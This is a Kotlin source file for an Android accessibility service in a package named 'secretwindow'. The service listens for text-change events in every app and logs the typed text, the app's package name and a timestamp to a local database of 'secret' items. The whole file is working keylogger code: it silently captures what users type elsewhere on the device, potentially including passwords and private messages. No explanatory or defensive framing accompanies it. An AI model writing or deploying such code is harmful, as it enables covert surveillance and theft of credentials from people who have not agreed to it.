package com.appify.secretwindow

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import com.appify.secretwindow.dataModels.SecretItem
import com.appify.secretwindow.localDatabase.SecretItemsDatabase
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.util.*


class SecretWindowService : AccessibilityService() {
    private var databaseInstance: SecretItemsDatabase? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 100
        serviceInfo = info

        databaseInstance = SecretItemsDatabase.getInstance()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event!!.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val receivedText = event.text.toString()
            val receivedTextSource = event.source?.packageName.toString()
            insertDataInDB(receivedText, receivedTextSource)
        }
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun insertDataInDB(receivedText: String, receivedTextSource: String) {
        GlobalScope.launch {
            databaseInstance?.getDatabaseDAO()
                ?.insertNewSecret(
                    SecretItem(
                        receivedTextSource,
                        Calendar.getInstance().time.toString(),
                        receivedText
                    )
                )
        }
    }

    override fun onInterrupt() {

    }
}